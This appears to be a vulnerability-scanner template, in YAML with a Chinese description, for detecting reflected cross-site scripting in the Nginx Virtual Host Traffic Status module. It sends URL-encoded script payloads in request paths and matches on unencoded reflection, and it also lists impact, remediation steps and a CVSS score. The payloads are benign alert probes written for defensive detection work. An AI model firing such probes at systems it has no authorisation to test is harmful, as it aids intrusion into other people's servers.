id: nginx-module-vts-xss

info:
  name: Nginx Virtual Host Traffic Status Module - 跨站脚本漏洞
  author: madrobot,j4vaovo
  severity: high
  description: |
    该模板用于检测 Nginx Virtual Host Traffic Status Module - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/_404_%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E`、`/status%3E%3Cscript%3Ealert(7331)%3C%2Fscript%3E` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://github.com/vozlt/nginx-module-vts
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-80
  metadata:
    max-request: 2
  tags: nginx,xss,status,vuln

http:
  - raw:
      - |
        GET /_404_%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /status%3E%3Cscript%3Ealert(7331)%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200"
          - "contains(header_2, 'text/html')"
          - "contains(tolower(body_2), '<script>alert(7331)</script>')"
        condition: and

      - type: dsl
        dsl:
          - "!contains(tolower(body_1), '<script>alert(1337)</script>')"
        condition: and
